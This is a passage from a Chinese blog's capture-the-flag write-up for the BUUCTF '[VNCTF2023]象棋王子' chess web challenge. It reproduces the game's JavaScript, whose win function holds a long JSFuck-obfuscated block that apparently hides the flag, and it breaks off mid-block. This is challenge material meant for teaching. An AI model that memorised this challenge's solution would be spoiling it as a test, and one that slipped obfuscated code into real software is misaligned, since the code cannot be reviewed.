@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  
+  <title>l-y-fのblog</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="l-y-fのblog">
+<meta property="og:url" content="https://l-y-f-f1111.github.io/page/2/index.html">
+<meta property="og:site_name" content="l-y-fのblog">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="l-y-f">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="l-y-fのblog" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
+
+  
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">
+
+<meta name="generator" content="Hexo 7.1.1"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">l-y-fのblog</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+        
+          <a class="nav-icon" href="/atom.xml" title="RSS 订阅"><span class="fa fa-rss"></span></a>
+        
+        <a class="nav-icon nav-search-btn" title="搜索"><span class="fa fa-search"></span></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="搜索"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://l-y-f-f1111.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+
+      <div class="outer">
+        <section id="main">
+  
+    <article id="post-2026-07-24-buuctf  [VNCTF2023]象棋王子" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/07/24/2026-07-24-buuctf%20%20%5BVNCTF2023%5D%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90/" class="article-date">
+  <time class="dt-published" datetime="2026-07-24T00:00:00.000Z" itemprop="datePublished">2026-07-24</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/07/24/2026-07-24-buuctf%20%20%5BVNCTF2023%5D%E8%B1%A1%E6%A3%8B%E7%8E%8B%E5%AD%90/">buuctf  [VNCTF2023]象棋王子</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：buuctf  [VNCTF2023]象棋王子<br>题目链接(<a target="_blank" rel="noopener" href="http://596c4cc309c643d6ee10324a.http-ctf2.dasctf.com/">http://596c4cc309c643d6ee10324a.http-ctf2.dasctf.com/</a>)<br>题目描述：<br>解题思路：<br>启动靶机 这是个下棋题目<br><img src="/images/Pastedimage20260724174158.png"><br>象棋题在CTF里通常是利用象棋逻辑做代码审计、反序列化、RCE或条件竞争<br>优先尝试代码审计 F12查看源码<br><img src="/images/Pastedimage20260724175001.png"><br>JS 文件 &#x3D; JavaScript 文件 是以 <code>.js</code> 为扩展名的纯文本文件，用于存储 JavaScript 代码<br>特点：可在控制台直接调用函数 用户可修改和调试 可用 <code>eval()</code> 执行混淆代码<br>审计代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br></pre></td><td class="code"><pre><span class="line">var play = play||&#123;&#125;;</span><br><span class="line"></span><br><span class="line">play.init = function ()&#123;</span><br><span class="line">	</span><br><span class="line">	play.my				=	1;				//玩家方</span><br><span class="line">	play.map 			=	com.arr2Clone (com.initMap);		//初始化棋盘</span><br><span class="line">	play.nowManKey		=	false;			//现在要操作的棋子</span><br><span class="line">	play.pace 			=	[];				//记录每一步</span><br><span class="line">	play.isPlay 		=	true ;			//是否能走棋</span><br><span class="line">	play.mans 			=	com.mans;</span><br><span class="line">	play.bylaw 			= 	com.bylaw;</span><br><span class="line">	play.show 			= 	com.show;</span><br><span class="line">	play.showPane 		= 	com.showPane;</span><br><span class="line">	play.isOffensive	=	true;			//是否先手</span><br><span class="line">	play.depth			=	play.depth || 3;				//搜索深度</span><br><span class="line">	</span><br><span class="line">	play.isFoul			=	false;	//是否犯规长将</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">	com.pane.isShow		=	 false;			//隐藏方块</span><br><span class="line">	</span><br><span class="line">	//初始化棋子</span><br><span class="line">	for (var i=0; i&lt;play.map.length; i++)&#123;</span><br><span class="line">		for (var n=0; n&lt;play.map[i].length; n++)&#123;</span><br><span class="line">			var key = play.map[i][n];</span><br><span class="line">			if (key)&#123;</span><br><span class="line">				com.mans[key].x=n;</span><br><span class="line">				com.mans[key].y=i;</span><br><span class="line">				com.mans[key].isShow = true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	play.show();</span><br><span class="line">	</span><br><span class="line">	//绑定点击事件</span><br><span class="line">	com.canvas.addEventListener(&quot;click&quot;,play.clickCanvas)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//悔棋</span><br><span class="line">play.regret = function ()&#123;</span><br><span class="line">	var map  = com.arr2Clone(com.initMap);</span><br><span class="line">	//初始化所有棋子</span><br><span class="line">	for (var i=0; i&lt;map.length; i++)&#123;</span><br><span class="line">		for (var n=0; n&lt;map[i].length; n++)&#123;</span><br><span class="line">			var key = map[i][n];</span><br><span class="line">			if (key)&#123;</span><br><span class="line">				com.mans[key].x=n;</span><br><span class="line">				com.mans[key].y=i;</span><br><span class="line">				com.mans[key].isShow = true;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	var pace= play.pace;</span><br><span class="line">	pace.pop();</span><br><span class="line">	pace.pop();</span><br><span class="line">	</span><br><span class="line">	for (var i=0; i&lt;pace.length; i++)&#123;</span><br><span class="line">		var p= pace[i].split(&quot;&quot;)</span><br><span class="line">		var x = parseInt(p[0], 10);</span><br><span class="line">		var y = parseInt(p[1], 10);</span><br><span class="line">		var newX = parseInt(p[2], 10);</span><br><span class="line">		var newY = parseInt(p[3], 10);</span><br><span class="line">		var key=map[y][x];</span><br><span class="line">		//try&#123;</span><br><span class="line">	 </span><br><span class="line">		var cMan=map[newY][newX];</span><br><span class="line">		if (cMan) com.mans[map[newY][newX]].isShow = false;</span><br><span class="line">		com.mans[key].x = newX;</span><br><span class="line">		com.mans[key].y = newY;</span><br><span class="line">		map[newY][newX] = key;</span><br><span class="line">		delete map[y][x];</span><br><span class="line">		if (i==pace.length-1)&#123;</span><br><span class="line">			com.showPane(newX ,newY,x,y)	</span><br><span class="line">		&#125;</span><br><span class="line">		//&#125; catch (e)&#123;</span><br><span class="line">		//	com.show()</span><br><span class="line">		//	z([key,p,pace,map])</span><br><span class="line">			</span><br><span class="line">		//	&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	play.map = map;</span><br><span class="line">	play.my=1;</span><br><span class="line">	play.isPlay=true;</span><br><span class="line">	com.show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//点击棋盘事件</span><br><span class="line">play.clickCanvas = function (e)&#123;</span><br><span class="line">	if (!play.isPlay) return false;</span><br><span class="line">	var key = play.getClickMan(e);</span><br><span class="line">	var point = play.getClickPoint(e);</span><br><span class="line">	</span><br><span class="line">	var x = point.x;</span><br><span class="line">	var y = point.y;</span><br><span class="line">	</span><br><span class="line">	if (key)&#123;</span><br><span class="line">		play.clickMan(key,x,y);	</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		play.clickPoint(x,y);	</span><br><span class="line">	&#125;</span><br><span class="line">	play.isFoul = play.checkFoul();//检测是不是长将</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//点击棋子，两种情况，选中或者吃子</span><br><span class="line">play.clickMan = function (key,x,y)&#123;</span><br><span class="line">	var man = com.mans[key];</span><br><span class="line">	//吃子</span><br><span class="line">	if (play.nowManKey&amp;&amp;play.nowManKey != key &amp;&amp; man.my != com.mans[play.nowManKey ].my)&#123;</span><br><span class="line">		//man为被吃掉的棋子</span><br><span class="line">		if (play.indexOfPs(com.mans[play.nowManKey].ps,[x,y]))&#123;</span><br><span class="line">			man.isShow = false;</span><br><span class="line">			var pace=com.mans[play.nowManKey].x+&quot;&quot;+com.mans[play.nowManKey].y</span><br><span class="line">			//z(bill.createMove(play.map,man.x,man.y,x,y))</span><br><span class="line">			delete play.map[com.mans[play.nowManKey].y][com.mans[play.nowManKey].x];</span><br><span class="line">			play.map[y][x] = play.nowManKey;</span><br><span class="line">			com.showPane(com.mans[play.nowManKey].x ,com.mans[play.nowManKey].y,x,y)</span><br><span class="line">			com.mans[play.nowManKey].x = x;</span><br><span class="line">			com.mans[play.nowManKey].y = y;</span><br><span class="line">			com.mans[play.nowManKey].alpha = 1</span><br><span class="line">			</span><br><span class="line">			play.pace.push(pace+x+y);</span><br><span class="line">			play.nowManKey = false;</span><br><span class="line">			com.pane.isShow = false;</span><br><span class="line">			com.dot.dots = [];</span><br><span class="line">			com.show()</span><br><span class="line">			setTimeout(&quot;play.AIPlay()&quot;,500);</span><br><span class="line">			if (key == &quot;j0&quot;) play.showWin (-1);</span><br><span class="line">			if (key == &quot;J0&quot;) play.showWin (1);</span><br><span class="line">		&#125;</span><br><span class="line">	// 选中棋子</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		if (man.my===1)&#123;</span><br><span class="line">			if (com.mans[play.nowManKey]) com.mans[play.nowManKey].alpha = 1 ;</span><br><span class="line">			man.alpha = 0.6;</span><br><span class="line">			com.pane.isShow = false;</span><br><span class="line">			play.nowManKey = key;</span><br><span class="line">			com.mans[key].ps = com.mans[key].bl(); //获得所有能着点</span><br><span class="line">			com.dot.dots = com.mans[key].ps</span><br><span class="line">			com.show();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//点击着点</span><br><span class="line">play.clickPoint = function (x,y)&#123;</span><br><span class="line">	var key=play.nowManKey;</span><br><span class="line">	var man=com.mans[key];</span><br><span class="line">	if (play.nowManKey)&#123;</span><br><span class="line">		if (play.indexOfPs(com.mans[key].ps,[x,y]))&#123;</span><br><span class="line">			var pace=man.x+&quot;&quot;+man.y</span><br><span class="line">			//z(bill.createMove(play.map,man.x,man.y,x,y))</span><br><span class="line">			delete play.map[man.y][man.x];</span><br><span class="line">			play.map[y][x] = key;</span><br><span class="line">			com.showPane(man.x ,man.y,x,y)</span><br><span class="line">			man.x = x;</span><br><span class="line">			man.y = y;</span><br><span class="line">			man.alpha = 1;</span><br><span class="line">			play.pace.push(pace+x+y);</span><br><span class="line">			play.nowManKey = false;</span><br><span class="line">			com.dot.dots = [];</span><br><span class="line">			com.show();</span><br><span class="line">			setTimeout(&quot;play.AIPlay()&quot;,500);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			//alert(&quot;不能这么走哦！&quot;)	</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//Ai自动走棋</span><br><span class="line">play.AIPlay = function ()&#123;</span><br><span class="line">	//return</span><br><span class="line">	play.my = -1 ;</span><br><span class="line">	var pace=AI.init(play.pace.join(&quot;&quot;))</span><br><span class="line">	if (!pace) &#123;</span><br><span class="line">		play.showWin (1);</span><br><span class="line">		return ;</span><br><span class="line">	&#125;</span><br><span class="line">	play.pace.push(pace.join(&quot;&quot;));</span><br><span class="line">	var key=play.map[pace[1]][pace[0]]</span><br><span class="line">		play.nowManKey = key;</span><br><span class="line">	</span><br><span class="line">	var key=play.map[pace[3]][pace[2]];</span><br><span class="line">	if (key)&#123;</span><br><span class="line">		play.AIclickMan(key,pace[2],pace[3]);	</span><br><span class="line">	&#125;else &#123;</span><br><span class="line">		play.AIclickPoint(pace[2],pace[3]);	</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//检查是否长将</span><br><span class="line">play.checkFoul = function()&#123;</span><br><span class="line">	var p=play.pace;</span><br><span class="line">	var len=parseInt(p.length,10);</span><br><span class="line">	if (len&gt;11&amp;&amp;p[len-1] == p[len-5] &amp;&amp;p[len-5] == p[len-9])&#123;</span><br><span class="line">		return p[len-4].split(&quot;&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">play.AIclickMan = function (key,x,y)&#123;</span><br><span class="line">	var man = com.mans[key];</span><br><span class="line">	//吃子</span><br><span class="line">	man.isShow = false;</span><br><span class="line">	delete play.map[com.mans[play.nowManKey].y][com.mans[play.nowManKey].x];</span><br><span class="line">	play.map[y][x] = play.nowManKey;</span><br><span class="line">	play.showPane(com.mans[play.nowManKey].x ,com.mans[play.nowManKey].y,x,y)</span><br><span class="line">	</span><br><span class="line">	com.mans[play.nowManKey].x = x;</span><br><span class="line">	com.mans[play.nowManKey].y = y;</span><br><span class="line">	play.nowManKey = false;</span><br><span class="line">	</span><br><span class="line">	com.show()</span><br><span class="line">	if (key == &quot;j0&quot;) play.showWin (-1);</span><br><span class="line">	if (key == &quot;J0&quot;) play.showWin (1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">play.AIclickPoint = function (x,y)&#123;</span><br><span class="line">	var key=play.nowManKey;</span><br><span class="line">	var man=com.mans[key];</span><br><span class="line">	if (play.nowManKey)&#123;</span><br><span class="line">		delete play.map[com.mans[play.nowManKey].y][com.mans[play.nowManKey].x];</span><br><span class="line">		play.map[y][x] = key;</span><br><span class="line">		</span><br><span class="line">		com.showPane(man.x,man.y,x,y)</span><br><span class="line">		</span><br><span class="line">	</span><br><span class="line">		man.x = x;</span><br><span class="line">		man.y = y;</span><br><span class="line">		play.nowManKey = false;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">	com.show();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">play.indexOfPs = function (ps,xy)&#123;</span><br><span class="line">	for (var i=0; i&lt;ps.length; i++)&#123;</span><br><span class="line">		if (ps[i][0]==xy[0]&amp;&amp;ps[i][1]==xy[1]) return true;</span><br><span class="line">	&#125;</span><br><span class="line">	return false;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获得点击的着点</span><br><span class="line">play.getClickPoint = function (e)&#123;</span><br><span class="line">	var domXY = com.getDomXY(com.canvas);</span><br><span class="line">	var x=Math.round((e.pageX-domXY.x-com.pointStartX-20)/com.spaceX)</span><br><span class="line">	var y=Math.round((e.pageY-domXY.y-com.pointStartY-20)/com.spaceY)</span><br><span class="line">	return &#123;&quot;x&quot;:x,&quot;y&quot;:y&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//获得棋子</span><br><span class="line">play.getClickMan = function (e)&#123;</span><br><span class="line">	var clickXY=play.getClickPoint(e);</span><br><span class="line">	var x=clickXY.x;</span><br><span class="line">	var y=clickXY.y;</span><br><span class="line">	if (x &lt; 0 || x&gt;8 || y &lt; 0 || y &gt; 9) return false;</span><br><span class="line">	return (play.map[y][x] &amp;&amp; play.map[y][x]!=&quot;0&quot;) ? play.map[y][x] : false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">play.showWin = function (my)&#123;</span><br><span class="line">	play.isPlay = false;</span><br><span class="line">	if (my===1)&#123;</span><br><span class="line">		[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[